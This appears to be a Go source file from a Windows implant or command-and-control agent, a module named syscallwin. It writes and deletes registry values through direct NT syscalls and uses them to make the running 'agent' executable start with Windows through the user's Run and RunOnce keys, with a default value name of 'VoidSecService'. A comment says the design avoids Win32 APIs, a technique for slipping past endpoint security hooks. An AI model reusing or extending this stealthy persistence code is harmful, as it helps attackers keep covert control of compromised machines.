//go:build windows

package syscallwin

import (
	"fmt"
	"unicode/utf16"
	"unsafe"
)

func unicodeStr(s string) UnicodeString {
	encoded, _ := stringToUTF16(s)
	return UnicodeString{
		Length:        uint16(len(s) * 2),
		MaximumLength: uint16(len(s)*2 + 2),
		Buffer:        encoded,
	}
}

func objAttr(path string) ObjectAttributes {
	us := unicodeStr(path)
	return ObjectAttributes{
		Length:     uint32(unsafe.Sizeof(ObjectAttributes{})),
		ObjectName: &us,
		Attributes: OBJ_CASE_INSENSITIVE,
	}
}

func RegSetString(keyPath string, valueName string, data string) error {
	var keyHandle uintptr
	oa := objAttr(keyPath)
	var disposition uint32
	r1, err := DirectSyscall("NtCreateKey",
		uintptr(unsafe.Pointer(&keyHandle)), KEY_WRITE,
		uintptr(unsafe.Pointer(&oa)), 0, 0,
		REG_OPTION_NON_VOLATILE, uintptr(unsafe.Pointer(&disposition)),
	)
	if r1 != 0 || err != nil {
		return fmt.Errorf("NtCreateKey %s: NTSTATUS 0x%x", keyPath, r1)
	}
	defer NtClose(keyHandle)

	vn := unicodeStr(valueName)
	utf16Data, _ := stringToUTF16(data)
	byteLen := uint32(len(data)*2 + 2)
	dataBytes := make([]byte, byteLen)
	copy(dataBytes, unsafe.Slice((*byte)(unsafe.Pointer(utf16Data)), byteLen))

	r1, err = DirectSyscall("NtSetValueKey",
		keyHandle,
		uintptr(unsafe.Pointer(&vn)), 0, REG_SZ,
		uintptr(unsafe.Pointer(unsafe.SliceData(dataBytes))), uintptr(byteLen),
	)
	if r1 != 0 || err != nil {
		return fmt.Errorf("NtSetValueKey %s\\%s: NTSTATUS 0x%x", keyPath, valueName, r1)
	}
	return nil
}

func RegDeleteValue(keyPath string, valueName string) error {
	var keyHandle uintptr
	oa := objAttr(keyPath)
	r1, err := DirectSyscall("NtOpenKey",
		uintptr(unsafe.Pointer(&keyHandle)), KEY_ALL_ACCESS,
		uintptr(unsafe.Pointer(&oa)),
	)
	if r1 != 0 || err != nil {
		return err
	}
	defer NtClose(keyHandle)

	vn := unicodeStr(valueName)
	r1, err = DirectSyscall("NtDeleteValueKey", keyHandle, uintptr(unsafe.Pointer(&vn)))
	_ = r1
	_ = err
	return nil
}

func AddRunKeyPersistence(name string, exePath string) error {
	return RegSetString(`Software\Microsoft\Windows\CurrentVersion\Run`, name, exePath)
}

func RemoveRunKeyPersistence(name string) error {
	return RegDeleteValue(`Software\Microsoft\Windows\CurrentVersion\Run`, name)
}

func AddRunOnceKeyPersistence(name string, exePath string) error {
	return RegSetString(`Software\Microsoft\Windows\CurrentVersion\RunOnce`, name, exePath)
}

func RemoveRunOnceKeyPersistence(name string) error {
	return RegDeleteValue(`Software\Microsoft\Windows\CurrentVersion\RunOnce`, name)
}

// CurrentImagePath returns the running image's NT path (e.g.
// \??\C:\...\agent.exe) using ProcessImageFileName (class 27), so
// persistence on-boarding never calls a Win32 API.
func CurrentImagePath() (string, error) {
	var buf [0x400]byte
	outLen := uintptr(len(buf))
	r1, err := DirectSyscall("NtQueryInformationProcess",
		GetCurrentProcHandle(),
		27, // ProcessImageFileName
		uintptr(unsafe.Pointer(&buf[0])),
		outLen,
		uintptr(unsafe.Pointer(&outLen)),
	)
	if r1 != 0 || err != nil {
		return "", fmt.Errorf("NtQueryInformationProcess: NTSTATUS 0x%x %v", r1, err)
	}
	us := (*UnicodeString)(unsafe.Pointer(&buf[0]))
	if us.Buffer == nil || us.Length == 0 || us.Length > uint16(len(buf)) {
		return "", fmt.Errorf("invalid image path buffer")
	}
	units := make([]uint16, us.Length/2)
	copy(units, unsafe.Slice((*uint16)(unsafe.Pointer(us.Buffer)), us.Length/2))
	return string(utf16.Decode(units)), nil
}

// PersistRunKey registers the current agent image into the current user's
// Run key through direct registry syscalls. The stored value is the quoted
// image path so it survives spaces.
func PersistRunKey(valueName string) error {
	img, err := CurrentImagePath()
	if err != nil {
		return fmt.Errorf("resolve image path: %w", err)
	}
	if img == "" {
		return fmt.Errorf("empty image path")
	}
	if valueName == "" {
		valueName = "VoidSecService"
	}
	return AddRunKeyPersistence(valueName, `"`+img+`"`)
}
